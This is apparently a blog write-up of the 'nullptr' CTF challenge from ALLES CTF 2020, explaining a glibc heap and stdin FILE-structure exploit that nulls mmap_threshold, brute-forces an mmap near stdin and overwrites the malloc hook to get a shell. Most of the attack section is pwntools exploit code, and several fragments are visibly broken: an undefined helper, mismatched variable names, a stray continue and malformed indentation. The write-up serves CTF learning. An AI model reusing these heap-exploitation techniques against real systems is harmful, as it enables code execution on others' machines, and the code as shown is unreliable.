---
layout: "post"
title: "nullptr - ALLES CTF 2020"
date: 2020-09-09
tags: [Heap, File Structures, CTF]
---


**tl;dr**

+ Overwrite `mmap_threshold` with null and trim top chunk size.
+ Null out last 2 bytes of stdin's `_IO_buf_base` and brute force to get allocation on stdin.
+ Overwrite one of the jump tables with win function to get shell.

<!--more-->

**Challenge Points:** 453
**Solves: ** 4

We had a really great time this weekend with this year's edition of Alles CTF. I spent most of my time working on the challenge nullptr and in this post , I'll be discussing the intended solution for the challenge.

**PS:** We could not solve this during the CTF but the exploit idea is worth sharing.

## Challenge description

To begin with , we'd been provided with a pretty simple c source code which has 2 functionalities.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_me_out_of_this_mess() { execl("/bin/sh", "sh", NULL); }

int main(void) {
    unsigned long addr;
    int menuchoice;
    while (1) {
        printf("[1. view, 2. null, -1. exit]> \n"); fflush(stdout);
        scanf("%d", &menuchoice); getc(stdin);
        switch (menuchoice) {
        case 1:
            printf("view address> \n"); fflush(stdout);
            scanf("%lu", &addr); getc(stdin);
            printf("%p: %p\n", addr, *(void**)addr);
            break;
        case 2:
            printf("nuke address> \n"); fflush(stdout);
            scanf("%lu", &addr); getc(stdin);
            *(void**)addr = NULL;
            printf("ok!\n");
            break;
        case -1:
            printf("bye!\n");
            return 1;
        default:;
        }
    }
    return 0;
}

```

1. The view function prints the content of an address passed , hence we can be assured of all leaks ;).
2. The nuke function nulls out the content of an address passed.

Looks pretty simple doesn't it?

## Getting necessary leaks

Getting all required leaks is nothing but a trivial task.

Initially, we can directly get stack leak by passing any `non-numeric` value to scanf. Let's script it a bit.

```py

from pwn import *
import sys

HOST = 'dwadwda'
PORT = 123
LIBC = ELF("./libc.so.6",checksec = False)
while True:
    if(len(sys.argv)>1):
        io=remote(HOST,PORT)
        context.noptrace=True
    else:
        io=process('./nullptr',env = {"LD_PRELOAD" : "./libc.so.6"})

    reu = lambda a : io.recvuntil(a)
    sla = lambda a,b : io.sendlineafter(a,b)
    sl = lambda a : io.sendline(a)
    rel = lambda : io.recvline()
    sa = lambda a,b : io.sendafter(a,b)
    re = lambda a : io.recv(a)
    s = lambda a : io.send(a)

    def null(addr):
        sla(']> \n','2')
        sla('nuke address> \n',str(addr))

    def malloc(libc):
        base = libc + 0x1ea9b8
        null(base)

    if __name__=="__main__":
        sla(']> \n','1')
        reu('address> \n')
        s(p8(1))
        stack = int(re(14),16)
        libc = getdata(stack-0xd8) - 0x271e3
        code = getdata(stack-0x18) - 0x10ce
        log.info('stack = ' + hex(stack))
        log.info('libc = ' + hex(libc))
        log.info('code = ' + hex(code))
```

## Idea of exploitation

After carefully analyzing scanf's source code, sherl0ck came up with the idea of calling **malloc** again by `nulling` out `IO_buf_base`.

In the depths of scanf ,there resides a function called IO_doallocbuf.

```c
  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

```

The code is actually of the caller function of `_IO_doallocbuf` which is `_IO_new_file_underflow`.

It calls malloc with a fixed size of `blk_sizet` which is by default 0x1000 bytes.

From this point on , we were stuck , we tried nulling out the last 2 bytes of buf base in the hope of getting allocation at tcache structure , from there on we faked a 0x400 size arbitrary chunk in tcache and found another way to call malloc with size of 0x400 from stdout structure.

Well , getting allocation with stdout doesn't actually give us arbitrary write.

## The intended solution

Well , the intended solution is actually leveraging an mmap call from malloc. Let's see how this can be done.

+ Nulling out `mmap_threshold` with triggers a different code path in malloc.
+ Also , trimming top size by writing null misaligned finally calls mmap when malloc is invoked.

Now , all that we have to do is , brute force until an mmap happens near our stdin file structure and from there on , its a game over.

Let's take our script forward.

```py
        buf_base = libc + 0x1ea9b8
        input_buffer = getdata(buf_base)
        TARGET_REGION = libc + 0x1ea000
        TARGET_HOOK_OFFSET = 0xb70
        TARGET_STDIN_OFFSET = 0x980
        _IO_2_1_stdin_ = libc + LIBC.symbols['_IO_2_1_stdin_']
        mmap_threshold_ = libc + 0x1ea280
        MAIN_ARENA_TOP_CHUNK_PTR = libc_base + 0x1eabe0
        top_chunk = getdata(MAIN_ARENA_TOP_CHUNK_PTR + 8)
        _IO_stdfile_0_lock = libc_base + 0x1ed4d0
        __GI__IO_file_jumps = libc_base + 0x1ec4a0
        MASK = 0xffffffffffff0000
        if TARGET_REGION & MASK != TARGET_REGION:
            log.failure("Restart exploit")
            io.close()
        continue
        else:
            break
       #Null out top chunk partially keeping the inuse bit
       #Null out mmap_threshold and next malloc should call mmap
       null(mmap_threshold + 16) 
       null(top_chunk + 8 + 1)

       # malloc will now be mmap!
       # We keep calling mmap from malloc and bruteforce for getting allocation at stdin
       for _ in range(200):
           malloc(libc)
           input_buffer = getdata(_IO_2_1_stdin_ + 8 * 3)
           if (input_buffer & MASK) == TARGET_REGION:
               log.success('Hit')
               break

      
```

Once there's a hit , all that's left is to partially overwrite `IO_buf_base` and get allocation on stdin. Here , after getting allocation on stdin , we intend to overwrite malloc hook to get shell.

```py
        #Now we partially overwrite io buf base of stdin
        null(_IO_2_1_stdin_ + 8*7 - 6)
        _s = TARGET_STDIN_OFFSET
        data = p64(0xfbad2088) + p64(TARGET_REGION)*6 + p64(0)*5 + p64(0) + p8(0) + p64(_IO_stdfile_0_lock) + p32(0) + p64(__GI__IO_file_jumps)
        data = data.ljust(TARGET_HOOK_OFFSET,'x')

        sla(data)
        #overwritten malloc hook
        #call malloc to get shell
        malloc(libc)
        io.interactive()

```

### An alternative approach

We could be all lazy and let brute force do the work. A simpler yet time consuming approach would be to overwrite the last 3 bytes of stdin's `IO_buf_base` and wait for the magic to happen. Eventually , in one of the runs , it would match with binary bss and you get a direct write to GOT table.

## Conclusion

The challenge had really intersting concepts involved and we learnt quite alot. Kudos to the author Mrmaxmeier for the awesome challenge.

Here's the original script of the author - [Link](https://gist.github.com/Mrmaxmeier/830561d4a732b0af24bf29d685a9f74f)

